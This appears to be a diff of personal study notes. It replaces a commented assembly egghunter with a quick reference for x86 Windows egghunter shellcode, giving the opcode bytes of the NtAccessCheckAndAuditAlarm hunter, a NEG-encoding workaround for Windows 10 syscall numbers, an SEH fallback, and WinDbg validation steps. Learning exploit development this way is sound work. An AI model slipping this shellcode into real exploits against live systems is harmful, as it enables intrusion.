@@ -1,37 +1,90 @@
-### Whole Egghunter
+# Egghunter Quick Reference (x86 Windows)
 
-Minimal version:
+## 1. Tag Setup
+- Tag must be 4 bytes
+- Appears twice in memory
 
-```txt
-start:
-    xor edx, edx              ; EDX = 0 (start scanning)
+Example:
+    tag = b"w00t"
+    payload = tag + tag + shellcode
 
-page_align:
-    or dx, 0xfff              ; move to end of current page
+---
 
-next_page:
-    inc edx                   ; move to start of next page
+## 2. NtAccess Egghunter (Primary)
 
-check_page:
-    push edx
-    push 0x2
-    pop eax
-    int 0x2e                  ; probe memory
+### Use When
+- Syscall known
+- No badchar issues
+- Need smallest payload (~32 bytes)
 
-    cmp al, 0x5               ; access violation?
-    pop edx
-    je page_align             ; if invalid → skip page
+### Template (dynamic syscall)
+66 81 CA FF 0F      or dx,0xfff
+42                  inc edx
+52                  push edx
+6A XX               push syscall
+58                  pop eax
+CD 2E               int 0x2e
+3C 05               cmp al,5
+5A                  pop edx
+74 EF               je short
+B8 77 30 30 74      mov eax,"w00t"
+89 D7               mov edi,edx
+AF                  scasd
+75 EA               jne
+AF                  scasd
+75 E7               jne
+FF E7               jmp edi
 
-scan:
-    mov eax, 0x74303077       ; "w00t"
-    mov edi, edx
+---
 
-compare:
-    scasd                     ; check first 4 bytes
-    jne next_page
+## 3. Win10 Fix (NEG Encoding)
 
-    scasd                     ; check second 4 bytes
-    jne next_page
+Problem:
+    syscall > 0x7F → NULL bytes
 
-    jmp edi                   ; found → jump to shellcode
-```
+Fix:
+    mov eax, negative(syscall)
+    neg eax
+
+Example (0x1C6):
+    B8 3A FE FF FF   mov eax,0xfffffe3a
+    F7 D8            neg eax
+
+---
+
+## 4. SEH Egghunter (Fallback)
+
+### Use When
+- Syscalls fail
+- Badchars block encoding
+- Unknown OS version
+
+### Characteristics
+- ~60 bytes
+- No syscall dependency
+- Uses exception handling
+
+---
+
+## 5. WinDbg Workflow
+
+### Find syscall
+    u ntdll!NtAccessCheckAndAuditAlarm
+    → mov eax,XXXX
+
+### Set breakpoint
+    bp <int 2e addr>
+
+### Step
+    t / p
+
+### Validate
+    cmp al,5 works
+    EDI → tag
+
+---
+
+## 6. Success Condition
+
+    EIP → jmp edi
+    EDI → w00tw00t
